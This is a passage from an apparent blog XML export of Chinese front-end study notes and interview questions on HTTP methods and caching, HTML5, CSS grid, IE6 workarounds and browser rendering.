幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。所有的安全方法也都是幂等的。 GET /pageX HTTP/1.1 是幂等的。连续调用多次，客户端接收到的结果都是一样的： 1234GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1 POST /add_row HTTP/1.1 不是幂等的。如果调用多次，就会增加多行记录： 123POST /add_row HTTP/1.1POST /add_row HTTP/1.1 -&gt; Adds a 2nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 3rd row DELETE /idX/delete HTTP/1.1 是幂等的，即便是不同请求之间接收到的状态码不一样： 123DELETE /idX/delete HTTP/1.1 -&gt; Returns 200 if idX existsDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 as it just got deletedDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 8.4 可缓存如果要对响应进行缓存，需要满足以下条件： 请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。 响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300,301, 404, 405, 410, 414, and 501。 响应报文的 Cache-Control 首部字段没有指定不进行缓存。 8.5 XMLHttpRequest 为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest： XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。 在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。 九、各版本比较9.1 HTTP/1.0 与 HTTP/1.1 的区别 HTTP/1.1 默认是持久连接 HTTP/1.1 支持管线化处理 HTTP/1.1 支持虚拟主机 HTTP/1.1 新增状态码 100 HTTP/1.1 只是分块传输编码 HTTP/1.1 新增缓存处理指令 max-age 9.2 HTTP/1.1 与 HTTP/2.0 的区别9.2.1 多路复用HTTP/2.0 使用多路复用技术，使用同一个 TCP 连接来处理多个请求 9.2.2 首部压缩HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求通讯双方各自缓存一份首部字段表，从而避免了重复传输。 9.2.3 服务端推送在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 index.html 页面，服务端就把 index.js 一起发给客户端 9.2.4 二进制格式HTTP/1.1 的解析是基于文本的，而 HTTP/2.0 采用二进制格式]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试之html]]></title>
    <url>%2F2018%2F08%2F27%2Finter-html%2F</url>
    <content type="text"><![CDATA[Doctype作用？标准模式与兼容模式各有什么区别？ &lt;!DOCTYPE&gt;声明位于位于HTML文档中的第一行，处于 &lt;html&gt; 标签之前。告知浏览器的解析器用什么文档标准解析这个文档。DOCTYPE不存在或格式不正确会导致文档以兼容模式呈现。 标准模式的排版 和JS运作模式都是以该浏览器支持的最高标准运行。在兼容模式中，页面以宽松的向后兼容的方式显示,模拟老式浏览器的行为以防止站点无法工作。 ps:常见dotype： HTML4.01 strict：不允许使用表现性、废弃元素（如font）以及frameset。声明：&lt;!DOCTYPE HTML PUBLIC “-//W3C//DTD HTML 4.01//EN” “http://www.w3.org/TR/html4/strict.dtd&quot;&gt; HTML4.01 Transitional:允许使用表现性、废弃元素（如font），不允许使用frameset。声明：&lt;!DOCTYPE HTML PUBLIC “-//W3C//DTD HTML 4.01 Transitional//EN” “http://www.w3.org/TR/html4/loose.dtd&quot;&gt; HTML4.01 Frameset:允许表现性元素，废气元素以及frameset。声明：&lt;!DOCTYPE HTML PUBLIC “-//W3C//DTD HTML 4.01 Frameset//EN” “http://www.w3.org/TR/html4/frameset.dtd&quot;&gt; XHTML1.0 Strict:不使用允许表现性、废弃元素以及frameset。文档必须是结构良好的XML文档。声明：&lt;!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Strict//EN” “http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt; XHTML1.0 Transitional:允许使用表现性、废弃元素，不允许frameset，文档必须是结构良好的XMl文档。声明： &lt;!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN” “http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt; XHTML 1.0 Frameset:允许使用表现性、废弃元素以及frameset，文档必须是结构良好的XML文档。声明：&lt;!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Frameset//EN” “http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd&quot;&gt;HTML 5: &lt;!doctype html&gt; HTML5 为什么只需要写 &lt;!DOCTYPE HTML&gt;？ HTML5 不基于 SGML（标准统用标记语言），因此不需要对DTD进行引用，但是需要doctype来规范浏览器的行为（让浏览器按照它们应该的方式来运行）； 而HTML4.01基于SGML,所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型。 行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？ 行内元素有：a b span img input select strong… 块级元素有：div ul ol li dl dt dd h1 h2 h3 p… 常用的空元素有：&lt;br&gt; &lt;hr&gt; &lt;img&gt; &lt;link&gt; &lt;meta&gt;… 介绍一下你对浏览器内核的理解？主要分成两部分：渲染引擎(layout engineer或Rendering Engine)和JS引擎。 渲染引擎：负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入CSS等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核。 JS引擎则：解析和执行javascript来实现网页的动态效果。 最开始渲染引擎和JS引擎并没有区分的很明确，后来JS引擎越来越独立，内核就倾向于只指渲染引擎。 常见的浏览器内核有哪些？ Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML] Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等 Presto内核：Opera7及以上。 [Opera内核原为：Presto，现为：Blink;] Webkit内核：Safari,Chrome等。 [ Chrome的：Blink（WebKit的分支）] html5有哪些新特性、移除了那些元素？如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？ HTML5 现在已经不是 SGML 的子集，主要是关于图像，位置，存储，多任务等功能的增加。 绘画 canvas; 用于媒介回放的 video 和 audio 元素; 本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失; sessionStorage 的数据在浏览器关闭后自动删除; 语意化更好的内容元素，比如 article、footer、header、nav、section; 表单控件，calendar、date、time、email、url、search; 新的技术webworker, websocket, Geolocation; 移除的元素： 纯表现的元素：basefont，big，center，font, s，strike，tt，u; 对可用性产生负面影响的元素：frame，frameset，noframes； 支持HTML5新标签： IE8/IE7/IE6支持通过document.createElement方法产生的标签， 可以利用这一特性让这些浏览器支持HTML5新标签， 浏览器支持新标签后，还需要添加标签默认的样式。 当然也可以直接使用成熟的框架、比如html5shim; 123&lt;!--[if lt IE 9]&gt; &lt;script&gt; src="http://html5shim.googlecode.com/svn/trunk/html5.js"&lt;/script&gt;&lt;![endif]--&gt; 如何区分HTML5： DOCTYPE声明\新增的结构元素\功能元素 简述一下你对HTML语义化的理解？ 用正确的标签做正确的事情。 html语义化让页面的内容结构化，结构更清晰，便于对浏览器、搜索引擎解析; 即使在没有样式CSS情况下也以一种文档格式显示，并且是容易阅读的; 搜索引擎的爬虫也依赖于HTML标记来确定上下文和各个关键字的权重，利于SEO; 使阅读源代码的人对网站更容易将网站分块，便于阅读维护理解。 HTML5的离线储存怎么使用，工作原理能不能解释一下？ 在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件。 原理：HTML5的离线存储是基于一个新建的.appcache文件的缓存机制(不是存储技术)，通过这个文件上的解析清单离线存储资源，这些资源就会像cookie一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示。 如何使用： 页面头部像下面一样加入一个manifest的属性； 在cache.manifest文件的编写离线存储的资源； 123456789CACHE MANIFEST#v0.11CACHE:js/app.jscss/style.cssNETWORK:resourse/logo.pngFALLBACK:/ /offline.html 在离线状态时，操作window.applicationCache进行需求实现。 浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢？ 在线的情况下，浏览器发现html头部有manifest属性，它会请求manifest文件，如果是第一次访问app，那么浏览器就会根据manifest文件的内容下载相应的资源并且进行离线存储。如果已经访问过app并且资源已经离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的manifest文件与旧的manifest文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，那么就会重新下载文件中的资源并进行离线存储。 离线的情况下，浏览器就直接使用离线存储的资源。 请描述一下 cookies，sessionStorage 和 localStorage 的区别？ 传递性 cookie是网站为了标示用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。cookie数据始终在同源的http请求中携带（即使不需要），也会在浏览器和服务器间来回传递。 sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。 存储大小： cookie数据大小不能超过4k。 sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。 有期时间： localStorage 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据； sessionStorage 数据在当前浏览器窗口关闭后自动删除。 cookie 设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭 iframe有那些缺点？ iframe会阻塞主页面的Onload事件； 搜索引擎的检索程序无法解读这种页面，不利于SEO; iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载。 使用iframe之前需要考虑这两个缺点。如果需要使用iframe，最好是通过javascript动态给iframe添加src属性值，这样可以绕开以上两个问题。 Label的作用是什么？是怎么用的？label标签来定义表单控制间的关系,当用户选择该标签时，浏览器会自动将焦点转到和标签相关的表单控件上。 1234&lt;label for="Name"&gt;Number:&lt;/label&gt;&lt;input type="text" name="Name" id="Name"/&gt;&lt;label&gt;Date:&lt;input type="text" name="B"/&gt;&lt;/label&gt; HTML5的form如何关闭自动完成功能？给不想要提示的 form 或某个 input 设置为 autocomplete=&quot;off&quot;。 如何实现浏览器内多个标签页之间的通信? WebSocket、SharedWorker； 也可以调用localstorge、cookies等本地存储方式； localstorge另一个浏览上下文里被添加、修改或删除时，它都会触发一个storagechange事件，我们通过监听事件，控制它的值来进行页面信息通信；注意quirks：Safari 在无痕模式下设置localstorge值时会抛出 QuotaExceededError 的异常； webSocket如何兼容低浏览器？ Adobe Flash Socket ActiveX HTMLFile (IE) 基于 multipart 编码发送 XHR 基于长轮询的 XHR 页面可见性（Page Visibility API） 可以有哪些用途？ 通过监听页面visibilitychange事件，用document.hidden 的值检测页面当前是否可见，以及打开网页的时间等; 在页面被切换到其他后台进程的时候，自动暂停音乐或视频的播放； 如何在页面上实现一个圆形的可点击区域？ map+area或者svg border-radius 纯js实现 需要求一个点在不在圆上简单算法、获取鼠标坐标等等 实现不使用 border 画出1px高的线，在不同浏览器的标准模式与怪异模式下都能保持一致的效果&lt;div style=&quot;height:1px;overflow:hidden;background:red&quot;&gt;&lt;/div&gt; 网页验证码是干嘛的，是为了解决什么安全问题？ 区分用户是计算机还是人的公共全自动程序。可以防止恶意破解密码、刷票、论坛灌水； 有效防止黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试。 title与h1的区别、b与strong的区别、i与em的区别？ title属性没有明确意义只表示是个标题，H1则表示层次明确的标题，对页面信息的抓取也有很大的影响； strong是标明重点内容，有语气加强的含义，使用阅读设备阅读网络时：&lt;strong&gt;会重读，而&lt;B&gt;是展示强调内容。 i内容展示为斜体，em表示强调的文本； Physical Style Elements – 自然样式标签 b, i, u, s, pre Semantic Style Elements – 语义样式标签 strong, em, ins, del, code 应该准确使用语义样式标签, 但不能滥用, 如果不能确定时首选使用自然样式标签。]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[grid栅格布局]]></title>
    <url>%2F2018%2F08%2F27%2Fgrid%E6%A0%85%E6%A0%BC%E5%B8%83%E5%B1%80%2F</url>
    <content type="text"><![CDATA[1、历史四个布局阶段网页布局经历了四个历史阶段： table布局； float和position布局； flex布局，解决了传统布局方案三大痛点：排列方向、对齐方式和自适应尺寸； grid布局，二维布局模块，具有强大的内容尺寸和定位能力。 flex分为伸缩容器和伸缩项目，grid分为网格容器和网格项目。 2、grid布局-网格容器2.1 显示网格使用grid-template-columns和grid-template-rows可以显式设置一个网格的列（宽）和行（高）。 12345&lt;!--grid布局设置行高--&gt;.grid &#123; display: grid; grid-template-rows: 60px 40px;&#125; 1234.grid &#123; display: grid; grid-template-columns: 40px 50px 60px;&#125; fr单位表示网格容器中可用空间按比列分配。 12345.grid &#123; display: grid; grid-template-rows: 1fr 2fr; grid-template-colums: 1fr 1fr 2fr;&#125; minmax()函数来创建网格轨道的最小或最大尺寸。 12345.grid &#123; display: grid; grid-template-rows: minmax(100px, auto); grid-template-columns: 1fr 1fr 2fr;&#125; 使用repeat()可以创建重复的网络轨道，适用于创建相等尺寸的网格项目和多个网格项目。 12345.grid &#123; display: grid; grid-template-columns: 30px repeat(3, 1fr) 30px; grid-template-rows: repeat(3, 1fr);&#125; 2.2 间距 grid-columns-gap: 列与列之间的间距 grid-rows-gap: 行与行之间的间距 grid-gap: grid-columns-gap和grid-rows-gap的缩写 123456.grid &#123; display: grid; grid-template-columns: 1fr 1fr 2fr; grid-template-rows: 1fr 2fr; grid-gap: 5px 10px;&#125; 3、grid布局-网格项目通过网格线可以定位网格项目。网格线实际上是代表线的开始、结束，两者之间就是网格列表或行。每条线是从网格轨道开始，网格的网格线从1开始，每条网格线逐步增加1。 1234567891011.grid &#123; display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 1fr 2fr;&#125;.item1 &#123; grid-rows-start: 2; grid-columns-start: 2; grid-columns-end: 4;&#125; grid-row是grid-row-start和grid-row-end的简写。grid-columns是grid-columns-start和grid-columns-end的简写。 关键字span后面紧随数字，表示合并多少个列或行 12345678910.grid &#123; display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 1fr 1fr;&#125;.item1 &#123; grid-row: 2/span 2; grid-column: span 3;&#125; grid-area 指定四个值，1：grid-row-start 2: grid-column-start 3: grid-row-end 4: grid-column-end 123456789.grid &#123; display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 1fr 1fr;&#125;.item1 &#123; gird-area: 1/2/2/4;&#125; grid目前的支持度还不是很多，IE完全不支持，支持的浏览器有Firefox 52, Safari 10.1, Chrome 57, Opera 44，了解上面这些就够了，深入了解其他特性]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试之css]]></title>
    <url>%2F2018%2F08%2F27%2Finter-css%2F</url>
    <content type="text"><![CDATA[Front-end-Developer-Questions FE-interview 介绍一下标准的CSS的盒子模型？低版本IE的盒子模型有什么不同的？ 有两种：IE盒模型、W3C盒模型 盒模型：内容（content）、填充（padding）、边框（border）、边界（margin） 区别：IE盒模型box-sizing为border-box，把border和padding计算在内 CSS选择符有哪些？哪些属性可以继承？选择符有： id选择器（#myid） 类选择器（.myclass） 标签选择器（div, h1, p） 相邻选择器（h1 + p） 子选择器（ul &gt; li） 后代选择器（li a） 通配符选择器（*） 属性选择器（input[type=”radio”]） 伪类选择器（a:hover, li:nth-child） 可继承的样式： 文字排版相关属性 font word-break letter-spacing text-align text-rendering word-space text-indent text-transform text-shadow color line-height cursor visibility 不可继承样式：border、padding、margin、width、height CSS优先级算法如何计算？ 优先级就近原则，同权重情况下样式定义最近者为准 载入样式以最后载入的定位为准 优先级 同权重: 内联样式表（标签内部）&gt; 嵌入样式表（当前文件中）&gt; 外部样式表（外部文件中）。 !important &gt; id &gt; class &gt; tagimportant 比 内联优先级高 css sprite是什么，有什么优缺点？将多个小图片拼接到一张图片种。通过background-position和元素尺寸调节显示的背景图片。 优点： 减少HTTP请求次数和图片总体大小，提高页面加载速度 更换风格方便，只需再一张或几张图片上修改颜色 缺点： 图片合并麻烦 IE6浏览器有哪些常见的bug,缺陷或者与标准不一致的地方,如何解决？ IE6不支持min-height，解决办法使用css hack： 12345.target &#123; min-height: 100px; height: auto !important; height: 100px; // IE6下内容高度超过会自动扩展高度&#125; ol内li的序号全为1，不递增。解决方法：为li设置样式display: list-item; 未定位父元素overflow: auto;，包含position: relative;子元素，子元素高于父元素时会溢出。解决办法： 子元素去掉position: relative；； 不能为子元素去掉定位时，父元素position: relative；; 12345678910111213141516171819&lt;style type="text/css"&gt;.outer &#123; width: 215px; height: 100px; border: 1px solid red; overflow: auto; position: relative; /* 修复bug */&#125;.inner &#123; width: 100px; height: 200px; background-color: purple; position: relative;&#125;&lt;/style&gt;&lt;div class="outer"&gt; &lt;div class="inner"&gt;&lt;/div&gt;&lt;/div&gt; IE6只支持a标签的:hover伪类，解决方法：使用js为元素监听mouseenter，mouseleave事件，添加类实现效果： 123456789101112131415161718192021222324252627282930313233&lt;style type="text/css"&gt;.p:hover,.hover &#123; background: purple;&#125;&lt;/style&gt;&lt;p class="p" id="target"&gt;aaaa bbbbb&lt;span&gt;DDDDDDDDDDDd&lt;/span&gt; aaaa lkjlkjdf j&lt;/p&gt;&lt;script type="text/javascript"&gt;function addClass(elem, cls) &#123; if (elem.className) &#123; elem.className += ' ' + cls; &#125; else &#123; elem.className = cls; &#125;&#125;function removeClass(elem, cls) &#123; var className = ' ' + elem.className + ' '; var reg = new RegExp(' +' + cls + ' +', 'g'); elem.className = className.replace(reg, ' ').replace(/^ +| +$/, '');&#125;var target = document.getElementById('target');if (target.attachEvent) &#123; target.attachEvent('onmouseenter', function () &#123; addClass(target, 'hover'); &#125;); target.attachEvent('onmouseleave', function () &#123; removeClass(target, 'hover'); &#125;)&#125;&lt;/script&gt; IE5-8不支持opacity，解决办法： 12345.opacity &#123; opacity: 0.4 filter: alpha(opacity=60); /* for IE5-7 */ -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=60)"; /* for IE 8*/&#125; IE6在设置height小于font-size时高度值为font-size，解决办法：font-size: 0; IE6不支持PNG透明背景，解决办法: IE6下使用gif图片 IE6-7不支持display: inline-block解决办法：设置inline并触发hasLayout 123display: inline-block;*display: inline;*zoom: 1; IE6下浮动元素在浮动方向上与父元素边界接触元素的外边距会加倍。解决办法： 1. 使用padding控制间距。 浮动元素display: inline;这样解决问题且无任何副作用：css标准规定浮动元素display:inline会自动调整为block 通过为块级元素设置宽度和左右margin为auto时，IE6不能实现水平居中，解决方法：为父元素设置text-align: center; CSS3新增伪类有那些？ p:first-of-type 选择属于其父元素的首个&lt;p&gt;元素的每个&lt;p&gt;元素。 p:last-of-type 选择属于其父元素的最后&lt;p&gt;元素的每个&lt;p&gt;元素。 p:only-of-type 选择属于其父元素唯一的&lt;p&gt; 元素的每个&lt;p&gt;元素。 p:only-child 选择属于其父元素的唯一子元素的每个&lt;p&gt;元素。 p:nth-child(2) 选择属于其父元素的第二个子元素的每个&lt;p&gt;元素。 ::after 在元素之前添加内容,也可以用来做清除浮动。 ::before 在元素之后添加内容 :enabled 表单控件启用或激活状态 :disabled 控制表单控件的禁用状态。 :checked 单选框或复选框被选中。 实现水平、垂直居中？水平且垂直居中方法（9种） position取值有哪几种？ static（默认）：元素框正常生成。块级元素生成一个矩形框，作为文档流的一部分；行内元素则会创建一个或多个行框，置于父级元素中。 relative：元素框相对于之前正常文档流中的位置发生偏移，并且原先的位置仍然被占据。发生偏移的时候，可能会覆盖其他元素。 absolute：元素框不再占有文档位置，并且相对于包含块进行偏移（所谓包含块就是最近一级外层元素position不为static的元素）。 fixed：元素框不再占有文档流位置，并且相对于视窗进行定位。 sticky：css3新增属性值，粘性定位，相当于relative和fixed的混合。最初会被当作是relative，相对原来位置进行偏移；一旦超过一定的阈值，会被当成fixed定位，相对于视口定位。 描述display: block;和display: inline;的具体区别？block元素特点 处于常规流中时，如果width没有设置，会自动填充满父容器 可以应用margin/padding 在没有设置高度的情况下会扩展高度以包含常规流中的子元素 处于常规流中时布局时在前后元素位置之间（独占一个水平空间） 忽略vertical-align inline元素特点 水平方向上根据direction依次布局 不会在元素前后进行换行 受white-space控制 margin/padding在竖直方向上无效，水平方向上有效 width/height属性对非替换行内元素无效，宽度由元素内容决定 非替换行内元素的行框高由line-height确定，替换行内元素的行框高由height,margin,padding,border决定 浮动或绝对定位时会转换为block vertical-align属性生效 用纯CSS创建一个三角形的原理是什么？一边设置颜色，另三边透明（颜色设为transparent） 纯css三角形及其应用 Chrome 中文界面下默认会将小于 12px 的文本强制按照 12px 显示？css属性：-webkit-text-size-adjust: none; 为什么要初始化CSS样式？因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化。 淘宝初始样式 123456789101112131415body, h1, h2, h3, h4, h5, h6, hr, p, blockquote, dl, dt, dd, ul, ol, li, pre, form, fieldset, legend, button, input, textarea, th, td &#123; margin:0; padding:0; &#125;body, button, input, select, textarea &#123; font:12px/1.5tahoma, arial, \5b8b\4f53; &#125;h1, h2, h3, h4, h5, h6&#123; font-size:100%; &#125;address, cite, dfn, em, var &#123; font-style:normal; &#125;code, kbd, pre, samp &#123; font-family:couriernew, courier, monospace; &#125;small&#123; font-size:12px; &#125;ul, ol &#123; list-style:none; &#125;a &#123; text-decoration:none; &#125;a:hover &#123; text-decoration:underline; &#125;sup &#123; vertical-align:text-top; &#125;sub&#123; vertical-align:text-bottom; &#125;legend &#123; color:#000; &#125;fieldset, img &#123; border:0; &#125;button, input, select, textarea &#123; font-size:100%; &#125;table &#123; border-collapse:collapse; border-spacing:0; &#125; position跟display、margin collapse、overflow、float这些特性相互叠加后会怎么样？ 如果元素的display为none，那么元素不被渲染，position和float不起作用 如果元素拥有position:absolute;或者position:fixed;属性那么元素将为绝对定位，float不起作用 如果元素float属性不是none,元素会脱离文档流，根据float属性值来显示 有浮动、绝对定位、inline-block属性的元素，margin不会和垂直方向上的其他元素margin折叠 对BFC规范(块级格式化上下文：block formatting context)的理解？加深理解BFC css定义权重以下是权重的规则：标签的权重为1，class的权重为10，id的权重为100 zoom:1的清除浮动原理？ 清除浮动，触发hasLayout； Zoom属性是IE浏览器的专有属性，它可以设置或检索对象的缩放比例。解决ie下比较奇葩的bug。 移动端布局有哪几种方法？待写… CSS优化、提高性能的方法有哪些？ 关键选择器（key selector）。选择器的最后面的部分为关键选择器（即用来匹配目标元素的部分）； 如果规则拥有 ID 选择器作为其关键选择器，则不要为规则增加标签。过滤掉无关的规则（这样样式系统就不会浪费时间去匹配它们了）； 提取项目的通用公有样式，增强可复用性，按模块编写组件；增强项目的协同开发性、可维护性和可扩展性; 使用预处理工具或构建工具（gulp对css进行语法检查、自动补前缀、打包压缩、自动优雅降级）； margin和padding分别适合什么场景使用？margin是用来隔开元素与元素的间距；padding是用来隔开元素与内容的间隔。 ::before 和 :before中双冒号和单冒号 有什么区别？解释一下这2个伪元素的作用。:表示伪类，::表示伪元素 w3c定义： CSS伪类用于向某些选择器添加特殊的效果 css伪元素用于将特殊的效果添加到某些选择器 伪类偏选择，伪元素偏元素 伪类有：:active, :focus, :hover, :link, :visited, :first-child, :lang 伪元素有：::first-letter, ::first-line, ::before, ::after font-style属性可以让它赋值为“oblique” oblique是什么意思？让没有倾斜的字体倾斜 让页面里的字体变清晰，变细用CSS怎么做？-webkit-font-smoothing: antialiased; 如果需要手动写动画，你认为最小时间间隔是多久，为什么？（阿里）多数显示器默认频率是60Hz，即1秒刷新60次，所以理论上最小间隔为1/60*1000ms =16.7ms display:inline-block 什么时候会显示间隙？(携程)移除空格、使用margin负值、使用font-size:0、letter-spacing、word-spacing 什么是Cookie 隔离？（或者说：请求资源的时候不要让它带cookie怎么做）如果静态文件都放在主域名下，那静态文件请求的时候都带有的cookie的数据提交给server的，非常浪费流量，所以不如隔离开。 因为cookie有域的限制，因此不能跨域提交请求，故使用非主要域名的时候，请求头中就不会带有cookie数据，这样可以降低请求头的大小，降低请求时间，从而达到降低整体请求延时的目的。 style标签写在body后与body前有什么区别？标准一直是规定style元素不应出现在body元素中，不过网页浏览器一直有容错设计。如果style元素出现在body元素，最终效果和style元素出现在head里是一样的。但是可能引起FOUC、重绘或重新布局。 什么是CSS 预处理器 / 后处理器？ 预处理器例如：LESS、Sass、Stylus，用来预编译Sass或less，增强了css代码的复用性，还有层级、mixin、变量、循环、函数等，具有很方便的UI组件模块化开发能力，极大的提高工作效率。 后处理器例如：PostCSS，通常被视为在完成的样式表中根据CSS规范处理CSS，让其更有效；目前最常做的是给CSS属性添加浏览器私有前缀，实现跨浏览器兼容性的问题。 display: none;和visibility: hidden;的区别？共同点： 都让元素不可见 区别： display: none;会让元素完全从渲染树中消失，渲染的时候不占据任何空间；visibility: hidden;不会让元素从渲染树消失，元素仍占据空间，只是内容不可见。 display: none;是继承属性，子孙节点消失由于元素从渲染树消失造成，通过修改子孙节点属性无法显示；visibility: hidden;是继承属性，子孙节点消失由于继承了该属性，通过设置visibility: visible;可以让其显示。 修改常规流中元素的display通常会造成文档重排。修改visibility只会造成元素的重绘。 读屏器不会读取display: none;元素内容，但会读取visibility: hidden;元素内容。 link和@import的区别？ link是HTML方式，@import是css方式。 link最大限度支持并行下载，@import过多嵌套导致串行下载，出现FOUC。 link可以通过rel=&quot;alternate stylesheet&quot;指定候选样式。 浏览器对link支持早于@import，可以使用@import对老浏览器隐藏样式。 @import必须再样式规则之前，可以再css文件中引用其他文件。 总体来说：link优于@import。 什么是FOUC？如何避免？ Flash Of Unstyled Content，用户定义样式表加载之前浏览器使用默认样式显示文档，用户样式加载渲染之后再重新显示文档，造成页面闪烁。 解决方法：把样式表放到文档的&lt;head&gt;。 清除浮动有哪几种方式？ 父级元素设置属性height 结尾处加一个块级空元素并clear: both; 父级定义伪元素::after并且属性为zoom: 1; clear: both; 父级元素设置属性overflow不为visible 父级也浮动，同时设置宽度 PNG，GIF，JPG的区别及如何选择？ PNG 有PNG8和truecolor PNG PNG8是256色 文件小，支持alpha透明度，无动画 适合背景图，图标，按钮 GIF 8位像素，256色 无损压缩 支持动画 支持boolean透明 适合简单动画 JPG 256色 有损压缩 不支持透明 适合照片 浏览器渲染机制是什么 浏览器渲染页面整个过程： 首先，解析HTML Source，构建DOM Tree； 同时，解析CSS Style，构建CSSOM Tree； 然后，组合DOM Tree与CSSOM Tree，去除不可见元素，构建Render Tree； 再执行Reflow，根据Render Tree计算每个可见元素的布局； 最后，执行Repaint，通过绘制流程，将每个像素渲染到屏幕上； 注意： Render Tree只包含渲染网页所需要的节点； Reflow过程是布局计算每个对象的精确位置和大小； Repaint过程则是将Render Tree的每个像素渲染到屏幕上； 重排（reflow）和重绘（repaint） 重排（又称回流），发生在Render Tree阶段，它主要用来确定元素的几何属性和位置 重绘，发生在重排（reflow）过程之后，将元素的颜色、背景属性绘制出来 怎样触发reflow和repaint触发Reflow 增加、删除和修改DOM节点时，会导致Reflow或Repaint 移动DOM位置，或者动画 修改位置样式 Resize窗口，或者是滚动 修改网页默认字体 触发Repaint 增加、删除和修改DOM节点 css改动 如何减少reflow和Repaint过程 减少js逐个修改样式，而是用添加、修改css类 通过documentFragment集中处理临时操作 克隆节点进行操作，然后进行原节点替换 使用display: none;进行批量操作 减少样式重新计算，即减少offset、scroll、clientX/Y、getComputedStyle、currentStyle的使用，因为每次使用都会刷新操作缓冲区，执行reflow和repaint]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试]]></title>
    <url>%2F2018%2F08%2F27%2Finterview%2F</url>
    <content type="text"><![CDATA[task1：上下高度固定，中间自适应 css盒模型标准模型、IE模型 box-sizing:content-box/border-boxjs如何获取盒模型的宽（或高）dom.style.widthdom.currentStyle.width –IEwindow.getComputedStyle(dom).widthdom.getBoundingClientRect().width 上下边界重叠，取最大值父子元素兄弟元素空元素（margin-top margin-bottom） BFC块级格式化上下文 原理就是渲染规则 垂直方向边距会发生重叠 不会浮动元素重叠 独立容器，外面的元素不会影响里面的元素 计算高度，浮动元素参与计算 可用来生成BFC的css属性 float不为none overflow不为visiable position为fixed和absolute display为inline-block table-cell table-caption flex inline-flex DOM事件DOM事件捕获流程自定义事件 // 当一个元素注册几个事件时，只执行第一个event.stopImmediatePropagation() 数据类型转化规则已具体延伸 文章参考一 文章参考二 前端工程分析 FE-interview interview book http协议类主要特点：简单快速、灵活、无连接和无状态 http报文组成部分：请求报文、响应报文请求报文：请求行（方法、协议和版本）、请求头（key和value值）、空行、请求体响应报文：响应行（协议、版本和状态码）、响应头（key和value值）、空行、响应体 http方法POST GET PUT（更新资源） DELETE（删除资源） HEAD(获取报文首部) GET和POST的优缺点： GET在浏览器回退时是无害的，而POST会再次提交请求 GET产生URL地址可以收藏，而POST不可以 GET请求会被浏览器主动缓存，而POST不会，除非收的那个设置 GET请求值能进行url编码，而POST支持多种编码方式 GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留 GET请求在URL中传送的参数是有长度限制的，而POST没有限制 对参数的数据类型，GET只接受ASCII字符，而POST没有限制 